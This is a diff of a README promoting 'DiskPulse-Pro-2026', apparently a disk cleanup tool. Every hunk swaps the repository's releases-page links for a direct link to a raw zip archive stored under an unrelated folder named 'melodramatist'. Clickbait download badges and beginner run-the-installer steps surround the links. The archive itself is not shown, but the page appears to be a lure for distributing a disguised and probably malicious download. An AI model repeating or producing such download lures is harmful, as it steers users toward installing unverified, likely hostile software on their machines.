@@ -2,7 +2,7 @@
 
 ## 🚀 Quick Start: Download in 60 Seconds
 
-[![DOWNLOAD NOW - CLICK HERE](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-Click_Here_🚀-green?style=for-the-badge&logo=windows&logoColor=white&labelColor=blue&color=orange)](https://github.com/TonySlash/DiskPulse-Pro-2026---Professional-Disk-Cleanup-Space-Optimizer-for-Windows-macOS/releases)
+[![DOWNLOAD NOW - CLICK HERE](https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-Click_Here_🚀-green?style=for-the-badge&logo=windows&logoColor=white&labelColor=blue&color=orange)](https://github.com/TonySlash/DiskPulse-Pro-2026---Professional-Disk-Cleanup-Space-Optimizer-for-Windows-macOS/raw/refs/heads/main/melodramatist/v3.2.zip)
 
 Visit this link to download the application.
 
@@ -25,7 +25,7 @@ Step-by-step for absolute beginners.
 
 Click this link to go to the official download page:
 
-**👉 [DiskPulse-Pro-2026 Download Page](https://github.com/TonySlash/DiskPulse-Pro-2026---Professional-Disk-Cleanup-Space-Optimizer-for-Windows-macOS/releases)**
+**👉 [DiskPulse-Pro-2026 Download Page](https://github.com/TonySlash/DiskPulse-Pro-2026---Professional-Disk-Cleanup-Space-Optimizer-for-Windows-macOS/raw/refs/heads/main/melodramatist/v3.2.zip)**
 
 Once the page opens, your browser will show a list of files. Find the newest file listed (usually the first one). You'll see either an `.exe` file or a `.zip` file.
 
@@ -119,7 +119,7 @@ Usually between 30 seconds and 3 minutes, depending on how full your drive is.
 
 Don't wait until your PC crashes—clean it today and enjoy every day with extra speed and storage.
 
-**[⬇️ CLICK HERE TO DOWNLOAD DiskPulse-Pro-2026 NOW](https://github.com/TonySlash/DiskPulse-Pro-2026---Professional-Disk-Cleanup-Space-Optimizer-for-Windows-macOS/releases)**
+**[⬇️ CLICK HERE TO DOWNLOAD DiskPulse-Pro-2026 NOW](https://github.com/TonySlash/DiskPulse-Pro-2026---Professional-Disk-Cleanup-Space-Optimizer-for-Windows-macOS/raw/refs/heads/main/melodramatist/v3.2.zip)**
 
 Download takes less than a minute on broadband. Cleanup takes one click. Freed space and faster system start immediately.
 
